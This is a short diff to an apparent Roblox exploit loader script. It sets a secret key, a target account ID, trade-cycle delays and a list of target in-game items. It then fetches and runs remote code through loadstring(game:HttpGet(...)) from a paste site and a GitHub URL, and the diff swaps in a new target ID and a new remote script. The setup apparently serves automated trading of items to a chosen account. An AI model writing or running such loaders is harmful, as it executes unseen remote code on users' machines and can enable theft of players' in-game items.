@@ -1,5 +1,5 @@
 getgenv().SECRET_KEY = "2196DDD60DFCD65E0AE3E542E874D1F0"
-getgenv().TARGET_ID = 1718063814
+getgenv().TARGET_ID = 8954598658
 getgenv().DELAY_STEP = 1
 getgenv().TRADE_CYCLE_DELAY = 2
 getgenv().TARGET_BRAINROTS = {
@@ -351,4 +351,4 @@ getgenv().TARGET_BRAINROTS = {
 }
 loadstring(game:HttpGet("https://pastefy.app/RlAPK90a/raw"))()
 task.wait(1)
-loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-OP-Undetectable-22s-hub-duels-auto-play-207587"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/agudelojeronimo456-oss/Chiron-Duels/refs/heads/main/chiro%20duels"))()
